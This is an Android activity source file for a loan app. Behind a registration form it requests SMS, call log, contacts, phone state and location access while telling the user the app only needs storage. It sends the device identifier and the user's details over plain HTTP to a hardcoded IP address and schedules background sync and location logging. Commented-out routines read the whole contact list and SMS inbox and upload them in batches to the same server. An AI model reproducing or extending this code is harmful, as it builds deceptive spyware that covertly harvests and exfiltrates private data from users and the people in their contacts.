package com.tst.hytonefinance;

import static android.service.controls.ControlsProviderService.TAG;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telecom.Call;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.NetworkResponse;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.ServerError;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.HttpHeaderParser;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;
import com.tst.hytonefinance.Background_Service.Test;
import com.tst.hytonefinance.Background_Service.local_backup;
import com.tst.hytonefinance.Background_Service.sync_data;
import com.tst.hytonefinance.Database.Location_DB;
import com.tst.hytonefinance.Database.SMS_data;
import com.tst.hytonefinance.Models.SMS;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.MalformedURLException;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Spliterator;
import java.util.Timer;
import java.util.TimerTask;

import pub.devrel.easypermissions.AfterPermissionGranted;
import pub.devrel.easypermissions.EasyPermissions;

public class MainActivity extends AppCompatActivity implements GoogleApiClient.ConnectionCallbacks, GoogleApiClient.OnConnectionFailedListener, com.google.android.gms.location.LocationListener{

    private static final String TAG = "Error";
    private TextView myTextView;
    private String Base_Url="http://3.135.51.200";
    String[] per = {Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.INTERNET,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION};

    public static final int Rc_setting = 123;
    private static final String TAG_ANDROID_CONTACTS = "ANDROID_CONTACTS";

    //******************* All Page **************************
    private LinearLayout Thank_you_page, Registration_page, Loading_page;

    //********** Register Page Element **************
    private EditText name, mobile_number, application_id, type_of_loan;
    private String Device_Details, permission_status;
    private boolean If_Application_Install;

    //********************** Location ***********
    private GoogleApiClient mGoogleApiClient;
    private Location mLocation;
    private LocationManager locationManager;
    private LocationRequest mLocationRequest;


    private Location_DB location_db;
    private SMS_data sms_data;

    AlarmManager alarmManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Define_Register_page_Element();
        try {
            requesrpermittion();
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
//        Start_background_process();

    }

    //**************************************************
    //                 Register_page
    //**************************************************
    private void Define_Register_page_Element() {
        name = (EditText) findViewById(R.id.user_name);
        mobile_number = (EditText) findViewById(R.id.mobile_number);
        application_id = (EditText) findViewById(R.id.application_id);
        type_of_loan = (EditText) findViewById(R.id.type_of_loan);
//        progressBar = (ProgressBar) findViewById(R.id.progressBar);
//        progressBar.setVisibility(View.GONE);
        Thank_you_page = (LinearLayout) findViewById(R.id.Thank_you_page);
        Registration_page = (LinearLayout) findViewById(R.id.Registration_page);
        Loading_page = (LinearLayout) findViewById(R.id.Loading_page);
        page_control(3);
        mGoogleApiClient = new GoogleApiClient.Builder(this)
                .addConnectionCallbacks(this)
                .addOnConnectionFailedListener(this)
                .addApi(LocationServices.API)
                .build();

        location_db=new Location_DB(MainActivity.this);
        sms_data=new SMS_data(MainActivity.this);
    }


    public void Do_Nothing(View v) {

    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        EasyPermissions.onRequestPermissionsResult(requestCode, permissions, grantResults, this);

        if (EasyPermissions.hasPermissions(this, per)) {
            try {
                requesrpermittion();
            } catch (MalformedURLException e) {
                e.printStackTrace();
            }

        } else {
            EasyPermissions.requestPermissions(this, "This app needs to access your Storage", Rc_setting, per);
        }
    }

    @AfterPermissionGranted(Rc_setting)
    private void requesrpermittion() throws MalformedURLException {

        if (EasyPermissions.hasPermissions(this, per)) {
            Check_user a = new Check_user();
            a.execute();
//            contact_spliterator();
//            SMS_spliterator();
//            readSMS();

        } else {
            EasyPermissions.requestPermissions(this, "This app needs to access your Storage", Rc_setting, per);
        }

    }

    private void Start_background_process()
    {
        Intent intent =new Intent(MainActivity.this, sync_data.class);
        intent.setAction("BackgroundProcess");

        PendingIntent pendingIntent=PendingIntent.getBroadcast(this,0,intent,0);
        AlarmManager alarmManager= (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, 0,24*60*60*1000,pendingIntent);

        Intent location_intent =new Intent(MainActivity.this, local_backup.class);
        intent.setAction("BackgroundProcess");

        PendingIntent location_pendingIntent=PendingIntent.getBroadcast(this,0,location_intent,0);
        AlarmManager location_alarmManager= (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        location_alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, 0,2*60*60*1000,location_pendingIntent);
    }

    @SuppressLint("MissingPermission")
    public String getDeviceIMEI() {
        String deviceId;

        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            deviceId = Settings.Secure.getString(
                    MainActivity.this.getContentResolver(),
                    Settings.Secure.ANDROID_ID);
        } else {
            TelephonyManager mTelephony = (TelephonyManager) MainActivity.this.getSystemService(Context.TELEPHONY_SERVICE);
            if (mTelephony.getDeviceId() != null) {
                deviceId = mTelephony.getDeviceId();
            } else {
                deviceId = Settings.Secure.getString(
                        MainActivity.this.getContentResolver(),
                        Settings.Secure.ANDROID_ID);
            }
        }

        return deviceId;
    }

    private String get_currant_date_time()
    {
        //---------- Get Currant Date nd Time ---------------
        Calendar c = Calendar.getInstance();
        System.out.println("Current time => "+c.getTime());
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

        return df.format(c.getTime());
    }




    private class Check_user extends AsyncTask<String, Void, String> {
        boolean is_User_exist = false;


        @Override
        protected void onPreExecute() {
            super.onPreExecute();
//            Toast.makeText(MainActivity.this, "Please wait...", Toast.LENGTH_SHORT).show();
//            progressBar.setVisibility(View.VISIBLE);

        }

        @Override
        protected String doInBackground(String... params) {
            try {
                Log.e("DeviceIMEI", getDeviceIMEI(), null);

                String url = Base_Url+"/api/v1/user/userBasicDetails/" + getDeviceIMEI();

                RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
                requestQueue.start();
                HashMap<String, String> params1 = new HashMap<String, String>();
                JsonObjectRequest jsObjRequest = new
                        JsonObjectRequest(Request.Method.GET,
                        url,
                        new JSONObject(params1),
                        new Response.Listener<JSONObject>() {
                            @Override
                            public void onResponse(JSONObject response) {
                                try {
//                                    progressBar.setVisibility(View.GONE);
                                    JSONObject data = response.getJSONObject("data");

                                    Log.e("API_data", String.valueOf(data.getString("data").equals("null")), null);

                                    if (String.valueOf(data.getString("data").equals("null")).toLowerCase(Locale.ROOT).equals("false")) {
                                        page_control(2);
                                        Start_background_process();
                                        Log.e("User_id", data.getJSONObject("data").getString("_id"), null);
                                    } else {
                                        page_control(1);

                                    }

                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                                Log.e("API_response", response.toString(), null);
                            }
                        }, new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        Log.e("API_Error", error.getMessage(), null);
                    }
                });
                requestQueue.add(jsObjRequest);

                Log.e("TAG2", "doInBackground: Connection Succesful", null);

            } catch (Exception r) {
                Log.e("Data_Error", r.toString());
            }
            return null;
        }

        @Override
        protected void onPostExecute(String result) {

        }
    }

    public void on_submit_click(View v) throws MalformedURLException {

        if (name.getText().toString().isEmpty()) {
            Toast.makeText(MainActivity.this, "Please Enter", Toast.LENGTH_SHORT).show();
        } else if (mobile_number.getText().toString().length() != 10) {
            Toast.makeText(MainActivity.this, "Please Enter 10 digit Mobile number", Toast.LENGTH_SHORT).show();
        } else if (application_id.getText().toString().isEmpty()) {
            Toast.makeText(MainActivity.this, "Please Enter Application Id", Toast.LENGTH_SHORT).show();
        } else if (type_of_loan.getText().toString().isEmpty()) {
            Toast.makeText(MainActivity.this, "Please Enter Loan Type", Toast.LENGTH_SHORT).show();
        } else {
            Add_User();
        }

    }

    private void Add_User() throws MalformedURLException {
//        progressBar.setVisibility(View.VISIBLE);
        RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
        requestQueue.start();
        Map<String, String> params2 = new HashMap<>();

        String Device_Details = System.getProperty("os.version") + "\n" +
                android.os.Build.VERSION.SDK + "\n" +
                android.os.Build.DEVICE + "\n" +
                android.os.Build.MODEL + "\n" +
                android.os.Build.PRODUCT + "\n" +
                Build.MANUFACTURER;

        params2.put("user_id", getDeviceIMEI());
        params2.put("name", name.getText().toString());
        params2.put("mobile", mobile_number.getText().toString());
        params2.put("application_id", application_id.getText().toString());
        params2.put("type_of_loan", type_of_loan.getText().toString());
        params2.put("device_details", Device_Details);
        params2.put("application_install", "true");
        params2.put("permission_status", "12");
        JsonObjectRequest jsObjRequest = new
                JsonObjectRequest(Request.Method.POST,
                        Base_Url+"/api/v1/user/userBasicDetails",
                        new JSONObject(params2),
                        new Response.Listener<JSONObject>() {
                            @Override
                            public void onResponse(JSONObject response) {
//                                progressBar.setVisibility(View.GONE);
                                try {

                                    Log.e("API_data", String.valueOf(response.getString("status").equals("success")), null);

                                    if (response.getString("status").equals("fail")) {
                                        Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();

                                        page_control(1);
//                                        Toast.makeText(MainActivity.this, "Some th", Toast.LENGTH_SHORT).show();
                                    } else {
                                        Toast.makeText(MainActivity.this, "Account Created", Toast.LENGTH_SHORT).show();
                                        page_control(2);
                                        requesrpermittion();
//                                        Toast.makeText(MainActivity.this, "Success", Toast.LENGTH_SHORT).show();
                                    }

                                } catch (JSONException | MalformedURLException e) {
                                    e.printStackTrace();
                                    Log.e("Request_response", e.getMessage(), null);
                                    Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();
                                }
                                Log.e("API_response", response.toString(), null);
                            }
                        },
                        new Response.ErrorListener() {
                            @Override
                            public void onErrorResponse(VolleyError error) {
//                                progressBar.setVisibility(View.GONE);
                                NetworkResponse response = error.networkResponse;
                                if (error instanceof ServerError && response != null) {
                                    try {
                                        String res = new String(response.data,
                                                HttpHeaderParser.parseCharset(response.headers, "utf-8"));
                                        // Now you can use any deserializer to make sense of data
                                        JSONObject obj = new JSONObject(res);
                                        Log.e("API_Response_Error 1", obj.toString(), null);
                                        Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();
                                    } catch (UnsupportedEncodingException | JSONException e1) {
                                        // Couldn't properly decode data to string
                                        e1.printStackTrace();
                                        Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();
                                    } // returned data is not JSONObject?

                                }
                                ;
                                Log.e("API_Response_Error", error.getMessage(), null);
                            }
                        }) {
                    @Override

                    public Map<String, String> getHeaders() throws AuthFailureError {
                        HashMap<String, String> headers = new HashMap<String, String>();
                        headers.put("Content-Type", "application/json; charset=utf-8");
                        return headers;
                    }
                };

        requestQueue.add(jsObjRequest);
    }

//    public void readCallLog(View view) {
//
//        ContentResolver cr = getContentResolver();
//        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
//                null, null, null, null);
//
//
//        JSONArray contact_jsonArray=new JSONArray();
//
//        StringBuffer sb = new StringBuffer();
//        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, null);
//        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
//        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
//        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
//        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
//        sb.append("Call Details :");
//        while (managedCursor.moveToNext()) {
//
//            String phNumber = managedCursor.getString(number);
//            String callType = managedCursor.getString(type);
//            String callDate = managedCursor.getString(date);
//            Date callDayTime = new Date(Long.valueOf(callDate));
//            String callDuration = managedCursor.getString(duration);
//
//            JSONObject temp=new JSONObject();
////            temp.put("name",);
//
//            String dir = null;
//            int dircode = Integer.parseInt(callType);
//            switch (dircode) {
//                case CallLog.Calls.OUTGOING_TYPE:
//                    dir = "OUTGOING";
//                    break;
//
//                case CallLog.Calls.INCOMING_TYPE:
//                    dir = "INCOMING";
//                    break;
//
//                case CallLog.Calls.MISSED_TYPE:
//                    dir = "MISSED";
//                    break;
//            }
//            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
//            sb.append("\n----------------------------------");
//        }
//        managedCursor.close();
//        myTextView.setText(sb);
//    }

    //******************* Page Control **************
    public void page_control(int page_number) {
        Registration_page.setVisibility(View.GONE);
        Thank_you_page.setVisibility(View.GONE);
        Loading_page.setVisibility(View.GONE);
        if (page_number == 1) {
            Registration_page.setVisibility(View.VISIBLE);
        } else if (page_number == 2) {
            Thank_you_page.setVisibility(View.VISIBLE);
        } else if (page_number == 3) {
            Loading_page.setVisibility(View.VISIBLE);
        }
    }


    //****************** Syne Controller ***********


//    private void Progress(int progress)
//    {
//        ProgressBar sync_progress=(ProgressBar) findViewById(R.id.sync_progress);
//        TextView progress_text=(TextView) findViewById(R.id.progress_text);
//        sync_progress.setProgress(progress);
//        progress_text.setText(progress+" %");
//    }
    //****************** Syne function *****************

//    //------------------ Contact List -------------------
//
//    @SuppressLint("Range")
//    private HashMap<String, String> getContactList() {
//        HashMap<String, String> map = new HashMap<>();
//        ContentResolver cr = getContentResolver();
//        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
//                null, null, null, null);
//        int index = 0;
//
//        if ((cur != null ? cur.getCount() : 0) > 0) {
//            while (cur != null && cur.moveToNext()) {
//                index++;
//                String id = cur.getString(
//                        cur.getColumnIndex(ContactsContract.Contacts._ID));
//                String name = cur.getString(cur.getColumnIndex(
//                        ContactsContract.Contacts.DISPLAY_NAME));
//
//                if (cur.getInt(cur.getColumnIndex(
//                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
//                    Cursor pCur = cr.query(
//                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
//                            null,
//                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
//                            new String[]{id}, null);
//                    while (pCur.moveToNext()) {
//                        String phoneNo = pCur.getString(pCur.getColumnIndex(
//                                ContactsContract.CommonDataKinds.Phone.NUMBER));
//                        map.put(name, phoneNo);
////                            JSONObject temp=new JSONObject();
////                            temp.put("name",name);
////                            temp.put("number",phoneNo);
//
//
//                        Log.i(TAG, "Name: " + name);
//                        Log.i(TAG, "Phone Number: " + phoneNo);
//                    }
//                    pCur.close();
//                }
//            }
//        }
//
//
//        if (cur != null) {
//            cur.close();
//        }
//        return map;
//    }
//
//    private void contact_spliterator() {
//        page_control(2);
//        HashMap<String, String> map = new HashMap<>();
//
//        map = getContactList();
//        EditText Text = (EditText) findViewById(R.id.Text);
//        Text.setText(String.valueOf(map));
//        JSONArray Contact_list = new JSONArray();
//        Log.e("map_size : ",String.valueOf(map.size()),null);
//
//        Progress(0);
//        int i = 1;
//        for (Map.Entry<String, String> e : map.entrySet()) {
//            Progress((int)((i-1.0)/map.size()*100));
//            Log.e("Progress : ",(int)((i-1.0)/map.size()*100)+"%",null);
//            JSONObject temp = new JSONObject();
//            try {
//                temp.put("name", e.getKey());
//                temp.put("number", e.getValue());
//                i++;
//
//                Contact_list.put(temp);
//                if (i % 500 == 0) {
//                    Log.e("Loop_contact : ",Contact_list.toString(),null);
//                    sync_list(Contact_list,Base_Url+"/api/v1/user/userContact","contact");
//                    Contact_list = new JSONArray();
//                }
//            } catch (JSONException jsonException) {
//                jsonException.printStackTrace();
//            }
//
//        }
//        if (i % 500 != 0)
//        {
//            Log.e("Outer_Loop_contact : ",Contact_list.toString(),null);
//            sync_list(Contact_list,Base_Url+"/api/v1/user/userContact","contact");
//        }
//
//
//    }
//
//
//    //------------------ Message List -------------------
//    @SuppressLint("SimpleDateFormat")
//    public ArrayList<SMS> readSMS() {
//        ArrayList<SMS> Message_list = new ArrayList<>();
//        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
//        cursor.moveToFirst();
//
////        if (cursor.moveToFirst()) { // must check the result to prevent exception
////            do {
////                String msgData = "";
////                for(int idx=0;idx<cursor.getColumnCount();idx++)
////                {
////                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
//////                    Log.e("Message_List_size : ",String.valueOf(Message_list.size()),null);
////                    Log.e("Colum",msgData,null);
////                }
////                // use msgData
////            } while (cursor.moveToNext());
////
////
////        } else {
////            // empty box, no SMS
////        }
//
////        Toast.makeText(MainActivity.this, String.valueOf(getAllSms.isLast()), Toast.LENGTH_SHORT).show();
//        for (int i = 0; !cursor.isLast(); i++) {
//            SMS temp_data = new SMS();
//
//            temp_data.setDate_time(cursor.getString(4));
//            temp_data.setTitle(cursor.getString(0));
//            temp_data.setMessage(cursor.getString(12));
//            temp_data.setSender(cursor.getString(2));
//            Message_list.add(temp_data);
//            Boolean check_data_flag = sms_data.Insert_Subject_data(temp_data.getTitle(),temp_data.getSender(),temp_data.getMessage(),temp_data.getDate_time());
//            if(!check_data_flag)
//            {
//                Toast.makeText(MainActivity.this, "Error", Toast.LENGTH_SHORT).show();
//                break;
//            }
//
////            SimpleDateFormat mdFormat = new SimpleDateFormat("dd-MMM-yyyy");
////            Date formatted_date = new Date();
//////            temp_data.setDate_time(mdFormat.format(temp_data.getDate_time()));
//
////            Log.e("Message : "+i,temp_data.toString(),null);
//            cursor.moveToNext();
//        }
////        Log.e("Message_List_size : ",String.valueOf(Message_list.size()),null);
////        Log.e("Message_List : ",String.valueOf(Message_list.toString()),null);
//
//        Toast.makeText(MainActivity.this, "Done", Toast.LENGTH_SHORT).show();
//        cursor.close();
//
//
//        return Message_list;
//    }
//
//    private void SMS_spliterator() {
//        page_control(2);
//        ArrayList<SMS> SMS_List=readSMS();
//
//        EditText Text = (EditText) findViewById(R.id.Text);
//        Text.setText(SMS_List.toString());
//
//        JSONArray SMS_list = new JSONArray();
//        Log.e("SMS_size : ",String.valueOf(SMS_List.size()),null);
//        Progress(0);
//        int i;
//        for (i=1;i<SMS_List.size();i++) {
//            Progress((int)((i+1.0)/SMS_List.size()*100));
//            Log.e("SMS_Progress : ",(int)((i+1.0)/SMS_List.size()*100)+"%",null);
//            JSONObject temp = new JSONObject();
//            try {
//                temp.put("tital", SMS_List.get(i-1).getTitle());
//                temp.put("sender", SMS_List.get(i-1).getSender());
//                temp.put("message", SMS_List.get(i-1).getMessage());
//                temp.put("date_time", SMS_List.get(i-1).getDate_time());
//
//                SMS_list.put(temp);
//                if (i % 100 == 0) {
////                    Toast.makeText(MainActivity.this, String.valueOf(SMS_list.length()), Toast.LENGTH_SHORT).show();
//                    Log.e("Loop_contact : " + i,"SMS_list.toString()",null);
//                    sync_list(SMS_list,Base_Url+"/api/v1/user/userMessage","message");
//                    SMS_list = new JSONArray();
////                    Toast.makeText(MainActivity.this, String.valueOf(SMS_list.length()), Toast.LENGTH_SHORT).show();
//                }
//            } catch (JSONException jsonException) {
//                jsonException.printStackTrace();
//            }
//
//        }
//
//        if (i % 100 != 0)
//        {
//            Log.e("Outer_Loop_contact : ","SMS_list.toString()",null);
//            sync_list(SMS_list,Base_Url+"/api/v1/user/userMessage","message");
//        }
//
//
//    }

    //----------------- Location ------------------------
    private void showGPSDisabledAlertToUser(){

        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
        alertDialogBuilder.setMessage("GPS is disabled in your device. Would you like to enable it?")
                .setCancelable(false)
                .setPositiveButton("Goto Settings Page To Enable GPS",
                        new DialogInterface.OnClickListener(){
                            public void onClick(DialogInterface dialog, int id){
                                Intent callGPSSettingIntent = new Intent(
                                        android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                                startActivity(callGPSSettingIntent);

                            }
                        });
        alertDialogBuilder.setNegativeButton("Cancel",
                new DialogInterface.OnClickListener(){
                    public void onClick(DialogInterface dialog, int id){
                        dialog.cancel();
                    }
                });
        AlertDialog alert = alertDialogBuilder.create();
        alert.show();
    }

    @Override
    public void onConnected(Bundle bundle) {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }

        mLocation = LocationServices.FusedLocationApi.getLastLocation(mGoogleApiClient);
        if(mLocation == null){
            startLocationUpdates();
        }
        if (mLocation != null) {
            double latitude = mLocation.getLatitude();
            double longitude = mLocation.getLongitude();
            String Ans="Longitude : "+longitude+",\nLatitude : "+latitude;
//            Text_lable.setText(Ans);


            Boolean check_data_flag = location_db.Insert_Subject_data(String.valueOf(longitude),String.valueOf(latitude),get_currant_date_time());
            Log.e("Location:",String.valueOf(check_data_flag),null);

        } else {

//            progressBar.setVisibility(View.VISIBLE);

//             Toast.makeText(this, "Location not Detected Automatically", Toast.LENGTH_SHORT).show();

        }
    }

    protected void startLocationUpdates() {
        // Create the location request
        mLocationRequest = LocationRequest.create()
                .setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY)
                .setInterval(2000);
        // Request location updates
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }

        LocationServices.FusedLocationApi.requestLocationUpdates(mGoogleApiClient,
                mLocationRequest, this);
        Log.d("reque", "--->>>>");

    }

    @Override
    public void onConnectionSuspended(int i) {
        Log.i(TAG, "Connection Suspended");
        mGoogleApiClient.connect();
//        Text_lable.setText("Connection Suspended");
    }

    @Override
    public void onConnectionFailed(ConnectionResult connectionResult) {
        Log.i(TAG, "Connection failed. Error: " + connectionResult.getErrorCode());
//        Text_lable.setText("Connection failed. Error: " + connectionResult.getErrorCode());
    }

    @Override
    public void onStart() {
        super.onStart();
        mGoogleApiClient.connect();
//        Toast.makeText(New_Case.this,"Connected",Toast.LENGTH_LONG).show();
    }

    @Override
    public void onStop() {
        super.onStop();
        if (mGoogleApiClient.isConnected()) {
            mGoogleApiClient.disconnect();
//            Text_lable.setText("Stop");
        }
    }

    @Override
    public void onLocationChanged(Location location) {
        double latitude = location.getLatitude();
        double longitude = location.getLongitude();
        Geocoder geocoder;
        List<Address> addresses;
        geocoder = new Geocoder(this, Locale.getDefault());

        String Ans="Longitude : "+longitude+",\nLatitude : "+latitude;


        Boolean check_data_flag = location_db.Insert_Subject_data(String.valueOf(longitude),String.valueOf(latitude),get_currant_date_time());
        Log.e("Location:",String.valueOf(check_data_flag),null);
//
//        try {
////            addresses = geocoder.getFromLocation(latitude, longitude, 1);
////            String address = addresses.get(0).getAddressLine(0); // If any additional address line present than only, check with max available address lines by getMaxAddressLineIndex()
////            String city = addresses.get(0).getLocality();
////            String state = addresses.get(0).getAdminArea();
////            String country = addresses.get(0).getCountryName();
////            String postalCode = addresses.get(0).getPostalCode();
////            String knownName = addresses.get(0).getFeatureName();
//
//
//
//        } catch (IOException e) {
//            e.printStackTrace();
//        }



    }


    //------------------ Sync Function List -------------------
    private void sync_list(JSONArray body_Array,String url,String Array_name) {
        RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
        requestQueue.start();


        try {
            JSONObject Details = new JSONObject();
            Details.put("user", getDeviceIMEI());
            Details.put(Array_name, body_Array);


//            Toast.makeText(MainActivity.this, Details.toString(), Toast.LENGTH_LONG).show();
//            System.out.print(Details.toString());
            JsonObjectRequest jsObjRequest = new
                    JsonObjectRequest(Request.Method.POST,
                            url,
                            Details,
                            new Response.Listener<JSONObject>() {
                                @Override
                                public void onResponse(JSONObject response) {
//                                    Toast.makeText(MainActivity.this, "onResponse", Toast.LENGTH_SHORT).show();

                                    try {
                                        Log.e("API_data", String.valueOf(response.getString("status").equals("success")), null);
//                                        Toast.makeText(MainActivity.this, response.toString(), Toast.LENGTH_SHORT).show();

                                        if (response.getString("status").equals("fail")) {
                                            Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();
                                            page_control(1);
//                                        Toast.makeText(MainActivity.this, "Some th", Toast.LENGTH_SHORT).show();
                                        } else {
                                            Toast.makeText(MainActivity.this, "sync message done", Toast.LENGTH_SHORT).show();
                                            page_control(2);
//                                        Toast.makeText(MainActivity.this, "Success", Toast.LENGTH_SHORT).show();
                                        }

                                    } catch (JSONException e) {
                                        e.printStackTrace();

                                        Log.e("Request_response", e.getMessage(), null);
                                        Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();
                                    }
                                    Log.e("API_response", response.toString(), null);
                                }
                            },
                            new Response.ErrorListener() {
                                @Override
                                public void onErrorResponse(VolleyError error) {
//                                    progressBar.setVisibility(View.GONE);
                                    Toast.makeText(MainActivity.this, "Error onResponse", Toast.LENGTH_SHORT).show();

                                    NetworkResponse response = error.networkResponse;
                                    if (error instanceof ServerError && response != null) {
                                        String res = null;
                                        try {
                                            res = new String(response.data,
                                                    HttpHeaderParser.parseCharset(response.headers, "utf-8"));
                                            Toast.makeText(MainActivity.this, res.toString(), Toast.LENGTH_LONG).show();
                                            Log.e("API_Response_Error 1", res.toString(), null);
                                            Toast.makeText(MainActivity.this, "Something Went Wrong\nPlease Try Again", Toast.LENGTH_SHORT).show();
                                        } catch (UnsupportedEncodingException e) {
                                            e.printStackTrace();
                                        }
                                        // Now you can use any deserializer to make sense of data
                                    }
                                    Log.e("API_Response_Error", error.getMessage(), null);
                                }
                            }) {
                        @Override
                        public Map<String, String> getHeaders() throws AuthFailureError {
                            HashMap<String, String> headers = new HashMap<String, String>();
                            headers.put("Content-Type", "application/json; charset=utf-8");
                            return headers;
                        }
                    };

            requestQueue.add(jsObjRequest);
        } catch (JSONException e) {
            e.printStackTrace();
        }


    }

    private void get_Location(){
        LocationManager locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)){
            AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
            alertDialogBuilder.setMessage("GPS is disabled in your device. Would you like to enable it?")
                    .setCancelable(false)
                    .setPositiveButton("Goto Settings Page To Enable GPS",
                            new DialogInterface.OnClickListener(){
                                public void onClick(DialogInterface dialog, int id){
                                    Intent callGPSSettingIntent = new Intent(
                                            android.provider.Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                                    startActivity(callGPSSettingIntent);
                                    finish();
                                }
                            });
            alertDialogBuilder.setNegativeButton("Cancel",
                    new DialogInterface.OnClickListener(){
                        public void onClick(DialogInterface dialog, int id){
                            dialog.cancel();
                        }
                    });
            AlertDialog alert = alertDialogBuilder.create();
            alert.show();
        }else{
            showGPSDisabledAlertToUser();
//                Toast.makeText(Starting_Page.this, "GPS is not Enabled in your device", Toast.LENGTH_SHORT).show();
        }
    }


}